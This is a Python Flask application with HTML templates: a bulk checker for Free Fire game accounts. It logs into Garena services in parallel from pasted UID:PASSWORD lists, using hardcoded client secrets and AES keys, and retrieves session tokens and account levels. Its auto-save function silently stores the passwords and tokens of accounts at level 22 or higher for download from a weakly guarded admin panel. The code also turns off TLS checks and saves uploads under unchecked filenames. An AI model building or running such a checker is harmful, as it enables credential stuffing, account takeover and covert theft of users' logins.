from flask import Flask, request, jsonify, render_template, redirect, render_template_string, send_from_directory, session
from flask_cors import CORS
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from concurrent.futures import ThreadPoolExecutor, as_completed
import base64
import json
import threading
import requests
import jwt
import urllib3
import os
from urllib.parse import parse_qs, urlparse, unquote
import my_pb2
import output_pb2

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = "M222HP_SECRET_KEY"
CORS(app)

# Configuration
AES_KEY = b'Yg&tc%DEuh6%Zc^8'
AES_IV = b'6oyZDr22E3ychjM%'
MAJOR_LOGIN_URL = "https://loginbp.ggpolarbear.com/MajorLogin"
PLATFORM_MAP = {1: "Garena", 3: "Facebook", 4: "Guest", 5: "VK", 6: "Huawei", 8: "Google", 11: "X", 13: "Apple"}
ADMIN_PASSWORD = "6606"
HTTP_TIMEOUT = 5
SAVED_DIR = "saved_accounts"
MUSIC_DIR = "static/music"
MUSIC_CONFIG = "music.json"

# Ensure directories exist
for d in [SAVED_DIR, MUSIC_DIR, "templates"]:
    if not os.path.exists(d): os.makedirs(d)

if not os.path.exists(MUSIC_CONFIG):
    with open(MUSIC_CONFIG, "w") as f:
        json.dump([{"name": "CYBER BEATS", "url": "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3"}], f)

HTTP_LOCAL = threading.local()

def http():
    if not hasattr(HTTP_LOCAL, "session"):
        s = requests.Session()
        s.verify = False
        adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
        s.mount('https://', adapter)
        HTTP_LOCAL.session = s
    return HTTP_LOCAL.session

# --- AUTO SAVER ---

def auto_save_account(data):
    try:
        level = int(data.get("level", 0))
        if level >= 22:
            filename = f"acc_{data.get('account_id') or data.get('uid')}_lvl{level}.json"
            filepath = os.path.join(SAVED_DIR, filename)
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
    except: pass
    return False

# --- CORE LOGIC ---

def encrypt_message(plaintext):
    return AES.new(AES_KEY, AES.MODE_CBC, AES_IV).encrypt(pad(plaintext, AES.block_size))

def decode_jwt_payload(token_value):
    try:
        return jwt.decode(token_value, options={"verify_signature": False})
    except:
        parts = token_value.split(".")
        if len(parts) < 2: return {}
        payload_b64 = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(payload_b64.encode("utf-8")))

def decode_ff_name(b64_str):
    try:
        if not b64_str: return ""
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip() + "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        return bytes(byte ^ key[i % len(key)] for i, byte in enumerate(encrypted_bytes)).decode("utf-8", errors="ignore")
    except: return ""

def pb_varint(value):
    output = bytearray(); value = int(value)
    while True:
        byte = value & 0x7F; value >>= 7
        if value: output.append(byte | 0x80)
        else: output.append(byte); break
    return bytes(output)

def pb_key(fn, wt): return pb_varint((fn << 3) | wt)
def pb_int(fn, val): return pb_key(fn, 0) + pb_varint(val)

def read_varint(data, index):
    shift = 0; value = 0
    while index < len(data):
        byte = data[index]; index += 1
        value |= (byte & 0x7F) << shift
        if not byte & 0x80: return value, index
        shift += 7
    return None, index

def parse_pb_fields(data):
    fields = {}; index = 0
    while index < len(data):
        key, index = read_varint(data, index)
        if key is None: break
        fn = key >> 3; wt = key & 7
        if wt == 0: value, index = read_varint(data, index)
        elif wt == 1: value = data[index:index + 8]; index += 8
        elif wt == 2:
            length, index = read_varint(data, index)
            if length is None: break
            value = data[index:index + length]; index += length
        elif wt == 5: value = data[index:index + 4]; index += 4
        else: break
        fields.setdefault(fn, []).append(value)
    return fields

def fetch_profile_stats(account_id, region, token_value):
    try:
        if str(region).upper() in {"BR", "US", "SAC", "NA"}: url = "https://client.us.freefiremobile.com/GetPlayerPersonalShow"
        else: url = "https://clientbp.ggpolarbear.com/GetPlayerPersonalShow"
        payload = encrypt_message(pb_int(1, int(account_id)) + pb_int(2, 1))
        headers = {"User-Agent": "Dalvik/2.1.0", "Authorization": f"Bearer {token_value}", "Content-Type": "application/x-www-form-urlencoded", "X-GA": "v1 1", "ReleaseVersion": "OB53"}
        response = http().post(url, data=payload, headers=headers, timeout=HTTP_TIMEOUT)
        if response.status_code != 200: return {}
        account_info = parse_pb_fields(response.content).get(1, [None])[0]
        info = parse_pb_fields(account_info)
        return {"level": info.get(6, [None])[0], "likes": info.get(21, [None])[0]}
    except: return {}

def major_login(access_token, open_id, platform_type):
    try:
        headers = {"User-Agent": "Dalvik/2.1.0", "Content-Type": "application/octet-stream", "X-GA": "v1 1", "ReleaseVersion": "OB53"}
        game_data = my_pb2.GameData()
        game_data.game_name = "free fire"; game_data.version_code = "1.108.3"; game_data.os_info = "Android OS 9"
        game_data.open_id = open_id; game_data.access_token = access_token
        game_data.platform_type = int(platform_type); game_data.field_99 = str(platform_type); game_data.field_100 = str(platform_type)
        response = http().post(MAJOR_LOGIN_URL, data=encrypt_message(game_data.SerializeToString()), headers=headers, timeout=HTTP_TIMEOUT)
        msg = output_pb2.Garena_420(); msg.ParseFromString(response.content)
        return getattr(msg, "token", None)
    except: return None

def generate_guest_account(uid, password):
    try:
        payload = {"uid": uid, "password": password, "response_type": "token", "client_type": "2", "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3", "client_id": "100067"}
        oauth = http().post("https://100067.connect.garena.com/oauth/guest/token/grant", data=payload, timeout=HTTP_TIMEOUT)
        data = oauth.json(); at = data.get("access_token"); oi = data.get("open_id")
        token = major_login(at, oi, 4)
        decoded = decode_jwt_payload(token)
        account_name = decode_ff_name(decoded.get("nickname", "")) or unquote(decoded.get("nickname", ""))
        region = decoded.get("lock_region")
        res = {"status": "success", "account_id": decoded.get("account_id"), "account_name": account_name, "region": region, "token": token, "uid": str(uid), "password": password, "platform": "Guest", "platform_type": 4}
        res.update(fetch_profile_stats(res["account_id"], region, token))
        auto_save_account(res)
        return res
    except Exception as e: return {"uid": uid, "status": "error", "message": str(e)}

def fetch_open_id(at):
    try:
        res = http().get("https://100067.connect.garena.com/oauth/token/inspect", params={"token": at}, timeout=HTTP_TIMEOUT)
        data = res.json() if res.status_code == 200 else {}
        oi = data.get("open_id") or data.get("openId")
        if oi: return oi, None
        uid_res = http().get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", headers={"access-token": at}, timeout=HTTP_TIMEOUT)
        uid = uid_res.json().get("uid")
        openid_res = http().post("https://topup.pk/api/auth/player_id_login", json={"app_id": 100067, "login_id": str(uid)}, timeout=HTTP_TIMEOUT)
        return openid_res.json().get("open_id") or openid_res.json().get("openId"), None
    except Exception as e: return None, str(e)

def generate_jwt_from_access(at, oi=None):
    if not oi:
        oi, error = fetch_open_id(at)
        if error: return {"status": "error", "message": error}, 400
    for pt in [8, 3, 6, 5, 11, 4, 1, 13]:
        token = major_login(at, oi, pt)
        if token:
            decoded = decode_jwt_payload(token)
            account_name = decode_ff_name(decoded.get("nickname", "")) or unquote(decoded.get("nickname", ""))
            region = decoded.get("lock_region")
            res = {"status": "success", "account_id": decoded.get("account_id"), "account_name": account_name, "region": region, "token": token, "platform": PLATFORM_MAP.get(pt, "Unknown"), "platform_type": pt}
            res.update(fetch_profile_stats(res["account_id"], region, token))
            auto_save_account(res)
            return res, 200
    return {"status": "error", "message": "no_valid_platform"}, 400

# --- ROUTES ---

@app.route("/", methods=["GET"])
def root():
    return jsonify({"status": "success", "web": "/web", "bulk": "/bulk"})

@app.route("/web")
def web_ui(): return render_template('index.html')

@app.route("/bulk")
def bulk_ui(): return render_template_string(BULK_HTML)

@app.route("/admin", methods=["GET", "POST"])
def admin_panel():
    if request.method == "POST":
        if request.form.get("password") == ADMIN_PASSWORD:
            session["admin"] = True
            return redirect("/admin")
        return render_template_string(ADMIN_LOGIN_HTML, error="Invalid Password")
    
    if not session.get("admin"):
        return render_template_string(ADMIN_LOGIN_HTML)
    
    saved_files = os.listdir(SAVED_DIR)
    music_list = []
    if os.path.exists(MUSIC_CONFIG):
        with open(MUSIC_CONFIG, "r") as f: music_list = json.load(f)
    
    return render_template_string(ADMIN_DASHBOARD_HTML, accounts=saved_files, music=music_list)

@app.route("/admin/logout")
def admin_logout():
    session.pop("admin", None)
    return redirect("/admin")

@app.route("/admin/delete_account/<filename>")
def delete_account(filename):
    if not session.get("admin"): return "Unauthorized", 401
    try: os.remove(os.path.join(SAVED_DIR, filename))
    except: pass
    return redirect("/admin")

@app.route("/admin/download_account/<filename>")
def download_account(filename):
    if not session.get("admin"): return "Unauthorized", 401
    return send_from_directory(SAVED_DIR, filename)

@app.route("/admin/delete_music/<int:index>")
def delete_music(index):
    if not session.get("admin"): return "Unauthorized", 401
    with open(MUSIC_CONFIG, "r+") as f:
        music = json.load(f)
        if 0 <= index < len(music):
            m = music.pop(index)
            if m["url"].startswith("/static/music/"):
                try: os.remove(m["url"][1:])
                except: pass
        f.seek(0); f.truncate(); json.dump(music, f)
    return redirect("/admin")

@app.route("/admin/add_music", methods=["POST"])
def add_music():
    if not session.get("admin"): return "Unauthorized", 401
    name = request.form.get("name")
    file = request.files.get("file")
    if name and file:
        filename = file.filename
        file.save(os.path.join(MUSIC_DIR, filename))
        with open(MUSIC_CONFIG, "r+") as f:
            music = json.load(f)
            music.append({"name": name, "url": f"/static/music/{filename}"})
            f.seek(0); f.truncate(); json.dump(music, f)
    return redirect("/admin")

@app.route("/get_music")
def get_music():
    if os.path.exists(MUSIC_CONFIG):
        with open(MUSIC_CONFIG, "r") as f: return jsonify(json.load(f))
    return jsonify([])

# --- API ENDPOINTS ---

@app.route("/token", methods=["GET", "POST"])
def api_token():
    at = request.values.get("access_token"); oi = request.values.get("open_id")
    if not at: return jsonify({"status": "error", "message": "missing_token"}), 400
    res, code = generate_jwt_from_access(at.strip(), oi.strip() if oi else None)
    return jsonify(res), code

@app.route("/guest", methods=["GET", "POST"])
def api_guest():
    u = request.values.get("uid"); p = request.values.get("password")
    if not u or not p: return jsonify({"status": "error", "message": "missing_credentials"}), 400
    res = generate_guest_account(u.strip(), p.strip())
    return jsonify(res), 200 if res.get("status") == "success" else 400

# --- TEMPLATES ---

ADMIN_LOGIN_HTML = r'''
<!doctype html><html><head><title>Admin Login</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@900&display=swap" rel="stylesheet">
<style>
body{background:#050508;color:white;font-family:'Orbitron',sans-serif;display:grid;place-items:center;height:100vh;margin:0}
.login-card{background:rgba(20,20,30,0.8);padding:40px;border-radius:20px;border:1px solid #00f2ff;text-align:center;box-shadow:0 0 30px rgba(0,242,255,0.2)}
input{background:black;border:1px solid #333;color:white;padding:15px;border-radius:10px;width:100%;margin:20px 0;text-align:center;font-size:1.2rem}
button{background:linear-gradient(45deg,#7000ff,#00f2ff);border:none;padding:15px 30px;color:white;border-radius:10px;cursor:pointer;font-weight:900}
.error{color:#ff3366;margin-bottom:10px;font-size:0.8rem}
</style></head><body>
<div class="login-card">
    <h1>ADMIN ACCESS</h1>
    {% if error %}<div class="error">{{error}}</div>{% endif %}
    <form method="POST"><input type="password" name="password" placeholder="ENTER KEY" autofocus><br><button type="submit">UNLOCK SYSTEM</button></form>
</div></body></html>
'''

ADMIN_DASHBOARD_HTML = r'''
<!doctype html><html><head><title>Admin Dashboard</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root{--primary:#00f2ff;--secondary:#7000ff;--bg:#050508;--card:rgba(20,20,30,0.9)}
body{background:var(--bg);color:#e0e0ff;font-family:'Rajdhani',sans-serif;margin:0;display:flex;min-height:100vh}
.sidebar{width:280px;background:rgba(10,10,15,0.9);border-right:1px solid rgba(255,255,255,0.05);padding:30px;display:flex;flex-direction:column;gap:20px}
.sidebar h1{font-family:'Orbitron';font-size:1.2rem;color:var(--primary);margin-bottom:30px}
.nav-item{padding:15px;border-radius:10px;color:var(--text-dim);text-decoration:none;display:flex;align-items:center;gap:12px;transition:0.3s}
.nav-item:hover,.nav-item.active{background:rgba(0,242,255,0.1);color:var(--primary)}
.content{flex:1;padding:40px;overflow-y:auto}
.card{background:var(--card);border-radius:20px;padding:30px;border:1px solid rgba(255,255,255,0.05);margin-bottom:30px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px;margin-bottom:30px}
.stat{background:rgba(255,255,255,0.02);padding:20px;border-radius:15px;text-align:center;border:1px solid rgba(255,255,255,0.05)}
.stat b{display:block;font-size:2rem;font-family:'Orbitron';color:var(--primary)}
table{width:100%;border-collapse:collapse}
th{text-align:left;padding:15px;border-bottom:1px solid #222;color:var(--primary);font-family:'Orbitron';font-size:0.7rem}
td{padding:12px 15px;border-bottom:1px solid #111}
.btn-del{color:#ff3366;cursor:pointer;background:none;border:none;font-size:1.1rem}
.btn-del:hover{transform:scale(1.2)}
.upload-form{display:flex;gap:10px;margin-top:20px}
input[type="text"],input[type="file"]{background:black;border:1px solid #333;color:white;padding:10px;border-radius:8px}
.btn-save{background:var(--primary);color:black;border:none;padding:10px 20px;border-radius:8px;font-weight:900;cursor:pointer}
</style></head><body>
<div class="sidebar">
    <h1>M222HP ADMIN</h1>
    <a href="#stats" class="nav-item active"><i class="fa-solid fa-chart-line"></i> Dashboard</a>
    <a href="#accounts" class="nav-item"><i class="fa-solid fa-user-shield"></i> Saved (22+)</a>
    <a href="#music" class="nav-item"><i class="fa-solid fa-music"></i> Music Manager</a>
    <div style="margin-top:auto"><a href="/admin/logout" class="nav-item" style="color:#ff3366"><i class="fa-solid fa-power-off"></i> Logout</a></div>
</div>
<div class="content">
    <div id="stats" class="card">
        <div class="grid">
            <div class="stat"><b>{{ accounts|length }}</b><span>SAVED ACCOUNTS</span></div>
            <div class="stat"><b>{{ music|length }}</b><span>TRACKS</span></div>
            <div class="stat"><b>6606</b><span>SECURE KEY</span></div>
        </div>
    </div>

    <div id="accounts" class="card">
        <h2><i class="fa-solid fa-floppy-disk"></i> AUTO-SAVED ACCOUNTS (LVL 22+)</h2>
        <table>
            <thead><tr><th>FILENAME</th><th>ACTIONS</th></tr></thead>
            <tbody>
                {% for acc in accounts %}
                <tr>
                    <td>{{ acc }}</td>
                    <td>
                        <a href="/admin/download_account/{{ acc }}" style="color:var(--primary);margin-right:15px"><i class="fa-solid fa-download"></i></a>
                        <a href="/admin/delete_account/{{ acc }}" style="color:#ff3366"><i class="fa-solid fa-trash"></i></a>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>

    <div id="music" class="card">
        <h2><i class="fa-solid fa-music"></i> MUSIC MANAGER</h2>
        <table>
            <thead><tr><th>NAME</th><th>URL</th><th>ACTIONS</th></tr></thead>
            <tbody>
                {% for m in music %}
                <tr>
                    <td>{{ m.name }}</td>
                    <td>{{ m.url }}</td>
                    <td><a href="/admin/delete_music/{{ loop.index0 }}" class="btn-del"><i class="fa-solid fa-xmark"></i></a></td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
        <form class="upload-form" action="/admin/add_music" method="POST" enctype="multipart/form-data">
            <input type="text" name="name" placeholder="Track Name" required>
            <input type="file" name="file" accept=".mp3" required>
            <button type="submit" class="btn-save">UPLOAD TRACK</button>
        </form>
    </div>
</div>
</body></html>
'''

BULK_HTML = r'''
<!doctype html>
<html lang="ru">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>BULK CHECKER • M222HP</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --primary: #00f2ff; --secondary: #7000ff; --bg-dark: #050508; --card-bg: rgba(15, 15, 25, 0.85); --text-main: #e0e0ff; --text-dim: #9494b8; --success: #00ff88; --error: #ff3366; --accent: #ff00ff; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Rajdhani', sans-serif; background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; position: relative; background: radial-gradient(circle at 20% 30%, rgba(112, 0, 255, 0.15) 0%, transparent 40%), radial-gradient(circle at 80% 70%, rgba(0, 242, 255, 0.15) 0%, transparent 40%); }
        body::before { content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, rgba(0, 0, 0, 0.05), rgba(0, 0, 0, 0.05) 1px, transparent 1px, transparent 2px); pointer-events: none; z-index: 100; }
        .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px; position: relative; z-index: 1; }
        header { text-align: center; margin-bottom: 40px; }
        .logo h1 { font-family: 'Orbitron', sans-serif; font-size: 3rem; font-weight: 900; letter-spacing: 5px; background: linear-gradient(to right, var(--primary), var(--secondary), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-transform: uppercase; filter: drop-shadow(0 0 10px rgba(0, 242, 255, 0.3)); }
        .nav-tabs { display: flex; justify-content: center; gap: 15px; margin-bottom: 30px; }
        .nav-tab { background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); padding: 10px 25px; border-radius: 12px; color: var(--text-dim); font-family: 'Orbitron', sans-serif; font-size: 0.8rem; cursor: pointer; transition: all 0.3s; text-decoration: none; display: flex; align-items: center; gap: 10px; }
        .nav-tab.active, .nav-tab:hover { background: rgba(0, 242, 255, 0.1); border-color: var(--primary); color: var(--primary); box-shadow: 0 0 15px rgba(0, 242, 255, 0.2); }
        .layout { display: grid; grid-template-columns: 400px 1fr; gap: 25px; }
        .card { background: var(--card-bg); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 25px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5); }
        .card h2 { font-family: 'Orbitron', sans-serif; font-size: 1rem; margin-bottom: 20px; color: var(--primary); display: flex; align-items: center; gap: 10px; }
        textarea { width: 100%; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 10px; padding: 15px; color: white; font-family: monospace; font-size: 0.9rem; outline: none; min-height: 400px; transition: all 0.3s; }
        .btn { width: 100%; background: linear-gradient(45deg, var(--secondary), var(--primary)); border: none; border-radius: 10px; padding: 14px; color: white; font-family: 'Orbitron', sans-serif; font-weight: 700; text-transform: uppercase; cursor: pointer; transition: all 0.3s; letter-spacing: 1px; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .metrics { display: grid; grid-template-columns: repeat(4, 1fr); gap: 15px; margin-bottom: 25px; }
        .metric { background: var(--card-bg); border: 1px solid rgba(255, 255, 255, 0.05); padding: 20px; border-radius: 15px; text-align: center; }
        .metric b { display: block; font-size: 1.8rem; font-family: 'Orbitron', sans-serif; color: var(--primary); }
        .table-container { background: var(--card-bg); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.05); overflow: hidden; max-height: 500px; overflow-y: auto; }
        table { width: 100%; border-collapse: collapse; font-size: 0.9rem; }
        th { background: rgba(255, 255, 255, 0.03); padding: 15px; text-align: left; color: var(--text-dim); font-family: 'Orbitron', sans-serif; font-size: 0.7rem; }
        td { padding: 12px 15px; border-top: 1px solid rgba(255, 255, 255, 0.05); }
        .badge { padding: 4px 8px; border-radius: 6px; font-weight: 700; font-size: 0.8rem; }
        .badge.ok { background: rgba(0, 255, 136, 0.1); color: var(--success); }
        .badge.warn { background: rgba(251, 191, 36, 0.1); color: #fbbf24; }
        .badge.bad { background: rgba(255, 51, 102, 0.1); color: var(--error); }
        @media (max-width: 900px) { .layout { grid-template-columns: 1fr; } }
        /* PLAYER STYLES */
        .music-container { position: fixed; bottom: 30px; right: 30px; background: rgba(15,15,25,0.9); border: 1px solid var(--primary); border-radius: 15px; padding: 15px 25px; z-index: 999; display: flex; align-items: center; gap: 20px; backdrop-filter: blur(10px); box-shadow: 0 0 30px rgba(0,242,255,0.1); }
        .music-btn { background: none; border: none; color: white; cursor: pointer; font-size: 1rem; }
        .play-btn { width: 40px; height: 40px; background: var(--primary); border-radius: 50%; color: black; display: grid; place-items: center; }
    </style>
</head>
<body>
    <div class="container">
        <header><div class="logo"><h1>BULK CHECKER</h1></div></header>
        <nav class="nav-tabs"><a href="/web" class="nav-tab"><i class="fa-solid fa-house"></i> Home</a><a href="/bulk" class="nav-tab active"><i class="fa-solid fa-layer-group"></i> Bulk</a></nav>
        <div class="layout">
            <aside>
                <div class="card">
                    <h2><i class="fa-solid fa-list-check"></i> INPUT</h2>
                    <textarea id="accounts" placeholder="UID:PASSWORD"></textarea>
                    <button class="btn" id="runBtn"><i class="fa-solid fa-play"></i> START SCAN</button>
                    <button class="btn" id="downloadBtn" style="background: rgba(0, 242, 255, 0.1); border: 1px solid var(--primary); color: var(--primary);"><i class="fa-solid fa-file-code"></i> DOWNLOAD JSON</button>
                    <button class="btn" id="clearBtn" style="background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);"><i class="fa-solid fa-trash"></i> CLEAR</button>
                    <div id="status" style="margin-top:10px;font-size:0.8rem">Ready.</div>
                </div>
            </aside>
            <main>
                <div class="metrics"><div class="metric"><b id="total">0</b><span>Total</span></div><div class="metric"><b id="ok">0</b><span>Success</span></div><div class="metric"><b id="lvl22">0</b><span>Lvl 22+</span></div><div class="metric"><b id="bad">0</b><span>Failed</span></div></div>
                <div class="table-container"><table><thead><tr><th>#</th><th>UID</th><th>LVL</th><th>REGION</th><th>NAME</th><th>STATUS</th></tr></thead><tbody id="rows"></tbody></table></div>
            </main>
        </div>
    </div>

    <div class="music-container">
        <div id="trackName" style="font-size:0.6rem;color:var(--primary);font-family:Orbitron">...</div>
        <button class="music-btn" id="prevBtn"><i class="fa-solid fa-backward-step"></i></button>
        <button class="music-btn play-btn" id="playBtn"><i class="fa-solid fa-play"></i></button>
        <button class="music-btn" id="nextBtn"><i class="fa-solid fa-forward-step"></i></button>
        <audio id="bgAudio" loop></audio>
    </div>

    <script>
        const $=id=>document.getElementById(id);let results=[];let running=false;
        function setStatus(t){$('status').textContent=t}
        function draw(){const ok=results.filter(r=>r.status==='success');$('total').textContent=results.length;$('ok').textContent=ok.length;$('lvl22').textContent=ok.filter(r=>Number(r.level||0)>=22).length;$('bad').textContent=results.filter(r=>r.status==='error').length;$('rows').innerHTML=results.map((r,i)=>{
            const lvl = Number(r.level || 0);
            const lvlClass = lvl >= 22 ? 'ok' : (lvl > 0 ? 'warn' : 'bad');
            return `<tr><td>${i+1}</td><td>${r.uid||'-'}</td><td><span class="badge ${lvlClass}">${r.level||'-'}</span></td><td>${r.region||'-'}</td><td>${r.account_name||'-'}</td><td><span class="badge ${r.status==='success'?'ok':'bad'}">${(r.status||'error').toUpperCase()}</span></td></tr>`
        }).join('')}
        async function one(u,p,i){try{const res=await fetch('/guest?uid='+encodeURIComponent(u)+'&password='+encodeURIComponent(p));const data=await res.json();results[i]={...data,uid:u,status:data.status==='success'?'success':'error'};draw()}catch(e){results[i]={uid:u,status:'error'};draw()}}
        $('runBtn').onclick=async()=>{if(running)return;const list=$('accounts').value.split('\n').filter(l=>l.includes(':'));if(!list.length)return;results=list.map(l=>({uid:l.split(':')[0],status:'pending'}));running=true;$('runBtn').disabled=true;setStatus('Scanning...');const q=[...list.keys()];const workers=Array(20).fill(0).map(async()=>{while(q.length>0){const i=q.shift();const parts=list[i].split(':');await one(parts[0].trim(),parts[1].trim(),i)}});await Promise.all(workers);running=false;$('runBtn').disabled=false;setStatus('Done.')};
        $('clearBtn').onclick=()=>{$('accounts').value='';results=[];draw();setStatus('Cleared.')};
        $('downloadBtn').onclick=()=>{
            if(!results.length) return setStatus('No data.');
            const blob = new Blob([JSON.stringify(results, null, 4)], {type: 'application/json'});
            const a = document.createElement('a'); a.href = URL.createObjectURL(blob);
            a.download = `bulk_results_${new Date().getTime()}.json`; a.click();
            URL.revokeObjectURL(a.href); setStatus('Downloaded.');
        };
        // Music Logic
        const audio=$('bgAudio');const pBtn=$('playBtn');let tracks=[];let cur=0;
        async function loadMusic(){try{const res=await fetch('/get_music');tracks=await res.json();if(tracks.length){audio.src=tracks[0].url;$('trackName').textContent=tracks[0].name}}catch(e){}}
        pBtn.onclick=()=>{if(audio.paused){audio.play();pBtn.innerHTML='<i class="fa-solid fa-pause"></i>'}else{audio.pause();pBtn.innerHTML='<i class="fa-solid fa-play"></i>'}};
        $('nextBtn').onclick=()=>{if(!tracks.length)return;cur=(cur+1)%tracks.length;audio.src=tracks[cur].url;$('trackName').textContent=tracks[cur].name;audio.play();pBtn.innerHTML='<i class="fa-solid fa-pause"></i>'};
        $('prevBtn').onclick=()=>{if(!tracks.length)return;cur=(cur-1+tracks.length)%tracks.length;audio.src=tracks[cur].url;$('trackName').textContent=tracks[cur].name;audio.play();pBtn.innerHTML='<i class="fa-solid fa-pause"></i>'};
        loadMusic();
    </script>
</body></html>
'''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=1080, debug=False)
